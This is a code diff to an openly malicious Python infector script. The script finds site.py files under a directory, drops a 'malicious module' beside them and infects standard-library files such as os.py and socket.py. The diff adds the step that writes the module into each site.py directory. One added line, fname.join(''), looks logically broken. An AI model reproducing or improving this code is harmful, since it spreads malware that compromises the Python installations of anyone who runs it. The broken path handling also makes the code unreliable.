@@ -14,7 +14,7 @@ DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropp
 #INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect
 
 
-def get_pkg_dir():
+def get_pkg_dir(pth):
     """
     Find the correct directory for default packages
     @return: The path of the python site packages
@@ -60,18 +60,21 @@ def drop_module(dest_file_path):
     return
 
 
-def find_site(pth):
+def find_site(search_pth):
     """
     Iterate through the given path and find all python files
     @param pth: the starting directory to search
     @return: an array of URIs of python files to infect
     """
     py_files = []
-    for subdir, dirs, files in os.walk(pth):        # iterate through everything
+    for subdir, dirs, files in os.walk(search_pth):        # iterate through everything
         for fil in files:
             fname = os.path.join(subdir, fil)
             if "site.py" in fname:                      # if it's the site module
                 py_files.append(fname)
+                finame = fname.split("/")[:-1]
+                finame = fname.join("")                 # get the directory
+                drop_module(finame)                     # write the module to the dir
 
     return py_files
 
@@ -109,8 +112,8 @@ def infect(search_dir):
     @param search_dir: The directory to start the recursive search in
     @return: none
     """
-    mod_dest = get_pkg_dir() + "/" + DEST_MODULE_NAME   # establish location for malicious module
-    drop_module(mod_dest)   # write the module
+    # mod_dest = get_pkg_dir() + "/" + DEST_MODULE_NAME   # establish location for malicious module
+    # drop_module(mod_dest)   # write the module  DO THIS ELSEWHERE
     py_files = find_site(search_dir)  # find python
     for f in py_files:
         print("Infecting " + f + "...")
